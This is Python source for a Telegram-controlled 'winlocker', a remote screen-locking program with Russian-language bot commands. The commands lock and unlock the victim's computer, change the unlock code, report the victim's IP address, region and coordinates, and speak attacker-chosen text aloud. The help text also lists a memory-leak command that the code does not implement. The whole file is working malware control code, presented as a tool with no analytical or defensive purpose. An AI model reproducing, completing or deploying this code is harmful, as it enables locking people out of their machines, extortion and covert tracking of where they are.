import locker
import telebot
import userinfo
import threading
import sound

bot = telebot.TeleBot("TOKEN")

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, text="Компьютер успешно заблокирован!")

@bot.message_handler(commands=['help'])
def start(message):
    bot.send_message(message.chat.id, text="/start - заблокировать компьютер\n/block - заблокирвать если скрыт\n/unblock - разблокировать\n/recode - поменять пароль\n/client_info - инфоромация о пользователе\n/ram-leak - начать утечку памяти\n/exit - ПОЛНОСТЬЮ завершить работу программы\n/play ТекстДляПроизношения - воспроизвести текст на компьютере")

@bot.message_handler(commands=['block'])
def start(message):
    locker.block_window()
    bot.send_message(message.chat.id, text="Компьютер был заблокирован!")

@bot.message_handler(commands=['unblock'])
def start(message):
    locker.unblock_window()
    bot.send_message(message.chat.id, text="Компьютер был Разблокирован!")

@bot.message_handler(commands=['recode'])
def start(message):
    if len(message.text.split()) == 1:
        bot.send_message(message.chat.id, text="Вы не ввели новый пароль")
    else:    
        import recode
        new_code = message.text.split('/recode ', 1)[1]

        recode.recode(new_code)

        bot.send_message(message.chat.id, text=f"Код для разблокировки успешно изменен на: {new_code}")

@bot.message_handler(commands=['play'])
def start(message):
    if len(message.text.split()) == 1:
        bot.send_message(message.chat.id, text="Вы не ввели текст!")
    else:    
        text = message.text.split('/play ', 1)[1]
        sound.say(text)
        bot.send_message(message.chat.id, text=f"Текст успешно воспроизведен!")

@bot.message_handler(commands=['client_info'])
def start(message):

    client = userinfo.get_info_by_ip(userinfo.get_ip())

    bot.send_message(message.chat.id, text=f"IP: {userinfo.get_ip()}\nСтрана: {client['country']}\nРегион: {client['regionName']}\nКоординаты: {client['lat']} {client['lon']}\nЧасовойПояс: {client['timezone']}")

@bot.message_handler(commands=['exit'])
def start(message):
    bot.send_message(message.chat.id, "Винлокер успешно был закрыт!")
    import sys
    sys.exit()

def bot_start():
    bot.polling(non_stop=True)

thread = threading.Thread(target=bot_start)
thread.start()

locker.start()